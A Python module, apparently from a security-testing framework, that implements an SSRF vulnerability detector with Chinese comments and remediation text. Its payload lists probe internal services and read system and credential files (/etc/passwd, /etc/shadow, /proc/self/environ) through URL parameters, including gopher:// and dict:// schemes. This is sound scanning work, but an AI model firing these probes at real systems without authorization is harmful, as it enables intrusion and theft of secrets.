"""SSRF 漏洞检测器"""
import re
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class SSRFDetector(BaseDetector):
    """SSRF 漏洞检测器"""

    name = "ssrf"
    category = "SSRF"
    MARKER = "secopsssrfd7e8f"

    INTERNAL_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
        "http://127.0.0.1:22",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
    ]

    FILE_PAYLOADS = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hostname",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///proc/version",
    ]

    PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:6379/",
        "netdoc:///etc/passwd",
    ]

    DNS_MARKER = "secopsssrfdns7e8f"

    INTERNAL_RESPONSE_PATTERNS = [
        (r"root:x:0:0", "/etc/passwd"),
        (r"root:.*:0:0", "/etc/passwd"),
        (r"SSH-[\d.]+", "SSH banner"),
        (r"HTTP/[\d.]+\s+\d+", "HTTP server"),
        (r"220.*FTP", "FTP service"),
        (r"\*[\d.]+", "Redis"),
    ]

    ERROR_PATTERNS = [
        r"connection refused",
        r"connection timed out",
        r"no route to host",
        r"network is unreachable",
        r"could not resolve host",
        r"ssl certificate problem",
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["url", "uri", "path", "src", "dest", "redirect",
                          "link", "href", "target", "fetch", "load",
                          "img", "image", "file", "page", "proxy",
                          "api", "endpoint", "callback", "webhook"]

        # 内网探测
        for param in params:
            for payload in self.INTERNAL_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("SSRF_INTERNAL", test_url, f"param={param}, payload={payload}")
                status, headers, body = http_get(test_url, timeout=8)

                if status == 0:
                    continue

                for pattern, service in self.INTERNAL_RESPONSE_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(Finding(
                            vuln_type="SSRF", severity="critical",
                            title=f"SSRF 内网探测 - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"检测到内网服务: {service}, 响应特征: {match.group()[:100] if (match := re.search(pattern, body, re.IGNORECASE)) else ''}",
                            description=f"参数 {param} 允许访问内网服务 ({payload})。",
                            remediation="白名单校验URL、禁止访问内网IP段、禁用非必要协议"
                        ))
                        break

                if any("SSRF" in f.vuln_type and param in f.title for f in findings):
                    break
                time.sleep(ATTACK_DELAY)

        # 文件协议探测
        for param in params:
            for payload in self.FILE_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("SSRF_FILE", test_url, f"param={param}, payload={payload}")
                status, headers, body = http_get(test_url, timeout=8)

                if status == 0:
                    continue

                if "root:" in body or "root x" in body:
                    findings.append(Finding(
                        vuln_type="SSRF", severity="critical",
                        title=f"SSRF 文件读取 - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence=f"成功读取文件内容: {body[:200]}",
                        description=f"参数 {param} 允许读取本地文件 ({payload})。",
                        remediation="禁止 file:// 协议、URL白名单校验"
                    ))
                    break

                if any("SSRF" in f.vuln_type and "文件读取" in f.title and param in f.title for f in findings):
                    break
                time.sleep(ATTACK_DELAY)

        return findings
